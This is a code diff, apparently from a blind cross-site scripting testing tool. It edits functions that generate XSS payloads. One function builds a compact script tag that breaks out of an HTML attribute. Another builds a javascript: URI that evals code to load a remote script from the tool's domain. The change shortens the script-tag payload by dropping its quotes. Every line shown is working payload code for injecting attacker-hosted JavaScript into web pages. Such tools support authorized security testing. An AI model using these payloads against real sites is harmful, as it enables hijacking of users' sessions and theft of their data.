@@ -96,7 +96,7 @@ export default {
             return "\"><script src=\"https://" + this.base_domain + "\"><\/script>";
         },
         basicshort_script: function() {
-            return "\"';><script/src=\"//" + this.base_domain + "\"><\/script>";
+            return "\"';><script/src=//" + this.base_domain + "><\/script>";
         },
         javascript_uri: function() {
             return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + this.base_domain + "\\';document.body.appendChild(a)')";
